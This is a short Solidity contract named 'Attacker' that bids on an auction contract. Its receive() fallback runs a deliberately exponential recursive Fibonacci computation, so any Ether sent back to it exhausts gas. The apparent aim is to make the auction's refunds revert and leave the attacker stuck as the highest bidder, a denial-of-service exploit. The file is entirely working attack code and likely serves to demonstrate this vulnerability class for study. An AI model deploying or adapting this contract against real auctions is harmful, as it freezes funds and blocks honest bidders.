pragma solidity ^0.8.0;

interface IAuction {
	function bid() external payable;
}

contract Attacker {
	function attack(address _auctionAddess) external payable {
		IAuction(_auctionAddess).bid{value: msg.value}();
	}

	receive() external payable {
		fibonacci(1024);
	}

	function fibonacci(uint n) public pure returns (uint) {
		if (n <= 1) {
			return n;
		} else {
			keccak256("Hash");
			return fibonacci(n - 1) + fibonacci(n - 2);
		}
	}
}
